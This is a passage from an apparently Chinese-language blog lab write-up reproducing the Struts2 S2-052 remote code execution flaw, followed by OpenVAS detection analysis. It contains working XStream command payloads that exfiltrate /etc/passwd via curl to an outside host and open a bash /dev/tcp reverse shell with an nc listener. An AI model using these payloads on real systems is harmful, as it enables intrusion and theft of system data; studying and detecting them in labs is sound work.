class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span><br><span class="line">&lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure></p><p>执行后去指定文件夹查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1e926d0b31efc0df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br>可以看到payload执行成功。</p><h3 id="Payload的大概规则"><a href="#Payload的大概规则" class="headerlink" title="Payload的大概规则"></a>Payload的大概规则</h3><p>在网上寻找了如何写payload的大概规则：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;touch /tmp/test.txt&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>比如上面这样的是不会执行的，如果远程执行的命令有空格则需要用string进行转换<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;<span class="built_in">echo</span>&lt;/string&gt;</span><br><span class="line">&lt;string&gt;abc&lt;/string&gt;</span><br><span class="line">&lt;string&gt;&gt;&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/tmp/abc&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>这样也是不行的，应该是不支持重定向符号&gt;，管道符 | 应该也不支持。<br>下面看看一些成功的例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;cp&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/etc/passwd&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/tmp/passwd&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;curl&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-F&lt;/string&gt;</span><br><span class="line">&lt;string&gt;value=@/etc/passwd&lt;/string&gt;</span><br><span class="line">&lt;string&gt; http://x.x.x.x/ &lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>curl命令执行可以成功，注意第三行<sting>的值不能有双引号，否则失败。<br>读取文件：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;curl&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-F&lt;/string&gt;</span><br><span class="line">&lt;string&gt;value=@/etc/passwd&lt;/string&gt;</span><br><span class="line">&lt;string&gt; http://x.x.x.x/ &lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></sting></p><p>通过在服务端<a href="http://x.x.x.x/抓包，发现/etc/passwd被post了过来。" target="_blank" rel="noopener">http://x.x.x.x/抓包，发现/etc/passwd被post了过来。</a></p><h3 id="尝试反弹shell"><a href="#尝试反弹shell" class="headerlink" title="尝试反弹shell"></a>尝试反弹shell</h3><p>首先尝试bash –c这个命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;touch /tmp/abc.txt&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>利用firefox抓包重发后，返回500：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-6f100a041e96f4a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>我们进入指定文件夹看看有没有写入成功：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-429ab44fe9449fa3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>成功写入，说明了bush 命令可以执行。<br>使用重定向符号&gt;创建任意文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;<span class="built_in">echo</span> abcd &gt;/tmp/abcd.txt&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>进入查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c07fecede473f26c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>成功！<br>可以把ip addr的命令执行结果输出到/tmp/ip.txt<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;ip addr &gt;/tmp/ip.txt&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-3b3f2cd46d45d60f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>成功，查看一下写入情况：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-cc259505a235e9ef.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12_LI.jpg"><br>全部导出了得到了！<br>下面开始尝试反弹shell，利用下面的命令：（&amp;要转换成&amp;amp）:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.72.141/22222 0&gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>在firefox编辑重发之前先要监听一个端口：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc –lvvp 22222   //port</span><br></pre></td></tr></table></figure></p><p>Firefox编辑重发后，上面填的是攻击方的ip和端口号就可以连接啦！：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8059257cadd155cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>成功反弹shell！</p><h3 id="试分析如果公司服务器存在这种漏洞，会对公司有什么影响？"><a href="#试分析如果公司服务器存在这种漏洞，会对公司有什么影响？" class="headerlink" title="试分析如果公司服务器存在这种漏洞，会对公司有什么影响？"></a>试分析如果公司服务器存在这种漏洞，会对公司有什么影响？</h3><p>我们尝试了可以远程执行命令成功，结合我们上个实验，如果我们写入一个木马到目标用户的指定路径下，则可进行进一步的攻击操作。比如写入反弹shell等等。攻击者可以进行各种操作从而获取服务器的给权限，并生成后门。便可进行一些非法操作，给公司造成包括信息泄露在内的巨大损失。</p><h2 id="使用openvas对该存在的漏洞系统进行扫描"><a href="#使用openvas对该存在的漏洞系统进行扫描" class="headerlink" title="使用openvas对该存在的漏洞系统进行扫描"></a>使用openvas对该存在的漏洞系统进行扫描</h2><h3 id="查看扫描结果，是否能得到对该漏洞的报告？"><a href="#查看扫描结果，是否能得到对该漏洞的报告？" class="headerlink" title="查看扫描结果，是否能得到对该漏洞的报告？"></a>查看扫描结果，是否能得到对该漏洞的报告？</h3><p><img src="http://upload-images.jianshu.io/upload_images/6269327-f0c7d5bcbf55003a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-742ff3e4cbe88ec8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>我们分别点开进入扫到了两个tomcat分析看到应该是第二个是对应的struts2-052漏洞，会导致远程代码执行漏洞：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-11f3ba2bf0a63857.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>在博主之前的博客说过如何查找nvt对应的文件，所以这里就不说了。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-21f819f69e771673.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>源码分析：<br>首先源码的前一段是输出了漏洞的信息，然后<br><img src="http://upload-images.jianshu.io/upload_images/6269327-ab7823d2e9a7e277.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"><br>这边是提供下面所要调用的函数。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-793372d08a25f6cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20.png"><br>这里是定义一些参数获取端口号已经利用函数get_kb_list对传参进行测试。然后根据然后判断存不存在漏洞。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-b08bf352d0a0a300.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="21.png"><br>对端口进行尝试连接，连不上则退出。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c25fc6821079d5b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="22.png"><br>接着进行系统测试。判断是什么系统。然后获取host的名字。<br>下面定义了一个参数data，就是我们使用的payload。就是需要改包在body里面的东西。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-93c61212bdfec821.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="23.png"><br>截止对调用url利用struts2的指定目录进行测试，发送请求，接受请求，然后对返回的请求进行检测。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-01f2217419844ed0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="25.png"><br>对返回进行检测。如果不存在漏洞则退出。If中一个条件是收到返回，另一个条件是windows或者linux主机判断成功。</p><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><p>这次遇到的最主要的问题就是在扫描是发现扫不出tomcat的远程执行漏洞。主要是两个问题。一个是我没有将struts2-showcase导入的tomcat的指定目录下，因为struts2-rest-showcase是用于我们测试，而nasl脚本测试的则是struts2-showcase。另一个则是没有下载官网提供的对应版本的webapps的文件。解决这两个问题之后就成功扫出来了。<br>在反射shell时要注意一点要在攻击机上先监听端口。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;Struts2-052漏洞学习&quot;&gt;&lt;a href=&quot;#Struts2-
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://rliyuqing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="struts2-052" scheme="https://rliyuqing.github.io/tags/struts2-052/"/>
    
  </entry>
  
</feed>
